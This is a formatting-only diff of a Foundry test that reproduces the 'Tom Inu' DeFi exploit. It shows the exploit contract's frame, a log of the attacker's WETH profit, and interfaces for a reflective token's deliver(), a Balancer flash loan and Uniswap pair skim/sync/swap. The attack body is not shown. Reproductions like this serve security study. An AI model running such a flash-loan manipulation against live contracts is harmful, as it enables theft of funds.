@@ -14,6 +14,7 @@ import "forge-std/Test.sol";
 // https://twitter.com/libevm/status/1618731761894309889
 
 contract TomInuExploit is Test {
+
     IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     reflectiveERC20 private constant TINU = reflectiveERC20(0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F);
 
@@ -79,36 +80,44 @@ contract TomInuExploit is Test {
 
         console.log("\n Attacker's profit: %s WETH", WETH.balanceOf(address(this)) / 1e18);
     }
+
 }
 
 /* -------------------- Interface -------------------- */
 interface reflectiveERC20 {
+
     function transfer(address to, uint256 amount) external returns (bool);
     function approve(address spender, uint256 amount) external returns (bool);
     function balanceOf(address account) external view returns (uint256);
     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
 
     function deliver(uint256 tAmount) external;
+
 }
 
 interface IWETH {
+
     function deposit() external payable;
     function transfer(address to, uint256 value) external returns (bool);
     function approve(address guy, uint256 wad) external returns (bool);
     function withdraw(uint256 wad) external;
     function balanceOf(address) external view returns (uint256);
+
 }
 
 interface IBalancerVault {
+
     function flashLoan(
         address recipient,
         address[] memory tokens,
         uint256[] memory amounts,
         bytes memory userData
     ) external;
+
 }
 
 interface IRouter {
+
     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
         uint256 amountIn,
         uint256 amountOutMin,
@@ -116,11 +125,14 @@ interface IRouter {
         address to,
         uint256 deadline
     ) external;
+
 }
 
 interface IUniswapV2Pair {
+
     function balanceOf(address) external view returns (uint256);
     function skim(address to) external;
     function sync() external;
     function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
+
 }
